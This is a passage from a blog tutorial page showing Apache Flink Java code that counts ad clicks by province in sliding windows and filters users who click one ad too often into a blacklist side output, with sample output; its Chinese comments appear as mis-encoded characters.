org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 6:41 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AdStatisticsByProvince</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</span></span><br><span class="line">    URL resource = AdStatisticsByProvince.class.getResource(<span class="string">&quot;/AdClickLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;AdClickEvent&gt; adClickEventDataStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> AdClickEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), fields[<span class="number">2</span>], fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;AdClickEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(AdClickEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. åŸºäºçœä»½åˆ†ç»„ï¼Œå¼€çª—èšåˆ</span></span><br><span class="line">    DataStream&lt;AdCountViewByProvince&gt; adCountStream = adClickEventDataStream</span><br><span class="line">      .keyBy(AdClickEvent::getProvince)</span><br><span class="line">      <span class="comment">// å®šä¹‰æ»‘çª—,5minè¾“å‡ºä¸€æ¬¡</span></span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.hours(<span class="number">1</span>), Time.minutes(<span class="number">5</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> AdCountAgg(), <span class="keyword">new</span> AdCountResult());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    adCountStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;ad count by province job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">AdCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">AdClickEvent</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(AdClickEvent value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">AdCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">AdCountViewByProvince</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String province, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;AdCountViewByProvince&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      String windowEnd = <span class="keyword">new</span> Timestamp(window.getEnd()).toString();</span><br><span class="line">      Long count = input.iterator().next();</span><br><span class="line">      out.collect(<span class="keyword">new</span> AdCountViewByProvince(province, windowEnd, count));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;beijing&#x27;, windowEnd=&#x27;2017-11-26 09:05:00.0&#x27;, count=2&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;shanghai&#x27;, windowEnd=&#x27;2017-11-26 09:05:00.0&#x27;, count=1&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;guangdong&#x27;, windowEnd=&#x27;2017-11-26 09:05:00.0&#x27;, count=2&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;guangdong&#x27;, windowEnd=&#x27;2017-11-26 09:10:00.0&#x27;, count=4&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;shanghai&#x27;, windowEnd=&#x27;2017-11-26 09:10:00.0&#x27;, count=2&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;beijing&#x27;, windowEnd=&#x27;2017-11-26 09:10:00.0&#x27;, count=2&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;shanghai&#x27;, windowEnd=&#x27;2017-11-26 09:15:00.0&#x27;, count=2&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;beijing&#x27;, windowEnd=&#x27;2017-11-26 09:15:00.0&#x27;, count=2&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;guangdong&#x27;, windowEnd=&#x27;2017-11-26 09:15:00.0&#x27;, count=5&#125;</span><br><span class="line">beans.AdCountViewByProvince&#123;province=&#x27;shanghai&#x27;, windowEnd=&#x27;2017-11-26 09:20:00.0&#x27;, count=2&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 2-ç‚¹å‡»å¼‚å¸¸è¡Œä¸ºé»‘åå•è¿‡æ»¤"><a href="#ä»£ç 2-ç‚¹å‡»å¼‚å¸¸è¡Œä¸ºé»‘åå•è¿‡æ»¤" class="headerlink" title="ä»£ç 2-ç‚¹å‡»å¼‚å¸¸è¡Œä¸ºé»‘åå•è¿‡æ»¤"></a>ä»£ç 2-ç‚¹å‡»å¼‚å¸¸è¡Œä¸ºé»‘åå•è¿‡æ»¤</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.AdClickEvent;</span><br><span class="line"><span class="keyword">import</span> beans.AdCountViewByProvince;</span><br><span class="line"><span class="keyword">import</span> beans.BlackListUserWarning;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.time.DateUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.functions.KeySelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 6:41 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AdStatisticsByProvince</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</span></span><br><span class="line">    URL resource = AdStatisticsByProvince.class.getResource(<span class="string">&quot;/AdClickLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;AdClickEvent&gt; adClickEventDataStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> AdClickEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), fields[<span class="number">2</span>], fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;AdClickEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(AdClickEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. å¯¹åŒä¸€ä¸ªç”¨æˆ·ç‚¹å‡»åŒä¸€ä¸ªå¹¿å‘Šçš„è¡Œä¸ºè¿›è¡Œæ£€æµ‹æŠ¥è­¦</span></span><br><span class="line">    SingleOutputStreamOperator&lt;AdClickEvent&gt; filterAdClickStream = adClickEventDataStream</span><br><span class="line">      .keyBy(<span class="keyword">new</span> KeySelector&lt;AdClickEvent, Tuple2&lt;Long, Long&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;Long, Long&gt; <span class="title">getKey</span><span class="params">(AdClickEvent value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(value.getUserId(), value.getAdId());</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .process(<span class="keyword">new</span> FilterBlackListUser(<span class="number">100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. åŸºäºçœä»½åˆ†ç»„ï¼Œå¼€çª—èšåˆ</span></span><br><span class="line">    DataStream&lt;AdCountViewByProvince&gt; adCountResultStream = filterAdClickStream</span><br><span class="line">      .keyBy(AdClickEvent::getProvince)</span><br><span class="line">      <span class="comment">// å®šä¹‰æ»‘çª—,5minè¾“å‡ºä¸€æ¬¡</span></span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.hours(<span class="number">1</span>), Time.minutes(<span class="number">5</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> AdCountAgg(), <span class="keyword">new</span> AdCountResult());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    adCountResultStream.print();</span><br><span class="line">    filterAdClickStream</span><br><span class="line">      .getSideOutput(<span class="keyword">new</span> OutputTag&lt;BlackListUserWarning&gt;(<span class="string">&quot;blacklist&quot;</span>)&#123;&#125;)</span><br><span class="line">      .print(<span class="string">&quot;blacklist-user&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;ad count by province job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">AdCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">AdClickEvent</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(AdClickEvent value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">AdCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">AdCountViewByProvince</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String province, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;AdCountViewByProvince&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      String windowEnd = <span class="keyword">new</span> Timestamp(window.getEnd()).toString();</span><br><span class="line">      Long count = input.iterator().next();</span><br><span class="line">      out.collect(<span class="keyword">new</span> AdCountViewByProvince(province, windowEnd, count));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰å¤„ç†å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">FilterBlackListUser</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">Long</span>, <span class="title">Long</span>&gt;, <span class="title">AdClickEvent</span>, <span class="title">AdClickEvent</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰å±æ€§ï¼šç‚¹å‡»æ¬¡æ•°ä¸Šçº¿</span></span><br><span class="line">    <span class="keyword">private</span> Integer countUpperBound;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FilterBlackListUser</span><span class="params">(Integer countUpperBound)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.countUpperBound = countUpperBound;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼Œä¿å­˜å½“å‰ç”¨æˆ·å¯¹æŸä¸€å¹¿å‘Šçš„ç‚¹å‡»æ¬¡æ•°</span></span><br><span class="line">    ValueState&lt;Long&gt; countState;</span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªæ ‡å¿—çŠ¶æ€ï¼Œä¿å­˜å½“å‰ç”¨æˆ·æ˜¯å¦å·²ç»è¢«å‘é€åˆ°äº†é»‘åå•é‡Œ</span></span><br><span class="line">    ValueState&lt;Boolean&gt; isSentState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      countState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;ad-count&quot;</span>, Long.class));</span><br><span class="line">      isSentState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Boolean&gt;(<span class="string">&quot;is-sent&quot;</span>, Boolean.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;AdClickEvent&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// æ¸…ç©ºæ‰€æœ‰çŠ¶æ€</span></span><br><span class="line">      countState.clear();</span><br><span class="line">      isSentState.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(AdClickEvent value, Context ctx, Collector&lt;AdClickEvent&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// åˆ¤æ–­å½“å‰ç”¨æˆ·å¯¹åŒä¸€å¹¿å‘Šçš„ç‚¹å‡»æ¬¡æ•°ï¼Œå¦‚æœä¸å¤Ÿä¸Šé™ï¼Œè¯¥countåŠ 1æ­£å¸¸è¾“å‡ºï¼›</span></span><br><span class="line">      <span class="comment">// å¦‚æœåˆ°è¾¾ä¸Šé™ï¼Œç›´æ¥è¿‡æ»¤æ‰ï¼Œå¹¶ä¾§è¾“å‡ºæµè¾“å‡ºé»‘åå•æŠ¥è­¦</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// é¦–å…ˆè·å–å½“å‰countå€¼</span></span><br><span class="line">      Long curCount = countState.value();</span><br><span class="line"></span><br><span class="line">      Boolean isSent = isSentState.value();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">null</span> == curCount)&#123;</span><br><span class="line">        curCount = <span class="number">0L</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">null</span> == isSent)&#123;</span><br><span class="line">        isSent = <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 1. åˆ¤æ–­æ˜¯å¦æ˜¯ç¬¬ä¸€ä¸ªæ•°æ®ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œæ³¨å†Œä¸€ä¸ªç¬¬äºŒå¤©0ç‚¹çš„å®šæ—¶å™¨</span></span><br><span class="line">      <span class="keyword">if</span> (curCount == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">long</span> ts = ctx.timerService().currentProcessingTime();</span><br><span class="line">        <span class="keyword">long</span> fixedTime = DateUtils.addDays(<span class="keyword">new</span> Date(ts), <span class="number">1</span>).getTime();</span><br><span class="line">        ctx.timerService().registerProcessingTimeTimer(fixedTime);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 2. åˆ¤æ–­æ˜¯å¦æŠ¥è­¦</span></span><br><span class="line">      <span class="keyword">if</span> (curCount &gt;= countUpperBound) &#123;</span><br><span class="line">        <span class="comment">// åˆ¤æ–­æ˜¯å¦è¾“å‡ºåˆ°é»‘åå•è¿‡ï¼Œå¦‚æœæ²¡æœ‰çš„è¯å°±è¾“å‡ºåˆ°ä¾§è¾“å‡ºæµ</span></span><br><span class="line">        <span class="keyword">if</span> (!isSent) &#123;</span><br><span class="line">          isSentState.update(<span class="keyword">true</span>);</span><br><span class="line">          ctx.output(<span class="keyword">new</span> OutputTag&lt;BlackListUserWarning&gt;(<span class="string">&quot;blacklist&quot;</span>)&#123;&#125;,</span><br><span class="line">                     <span class="keyword">new</span> BlackListUserWarning(value.getUserId(), value.getAdId(), <span class="string">&quot;click over &quot;</span> + countUpperBound + <span class="string">&quot;times.&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ä¸å†è¿›è¡Œä¸‹é¢æ“ä½œ</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// å¦‚æœæ²¡æœ‰è¿”å›ï¼Œç‚¹å‡»æ¬¡æ•°åŠ 1ï¼Œæ›´æ–°çŠ¶æ€ï¼Œæ­£å¸¸è¾“å‡ºå½“å‰æ•°æ®åˆ°ä¸»æµ</span></span><br><span class="line">      countState.update(curCount + <span class="number">1</span>);</span><br><span class="line">      out.collect(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 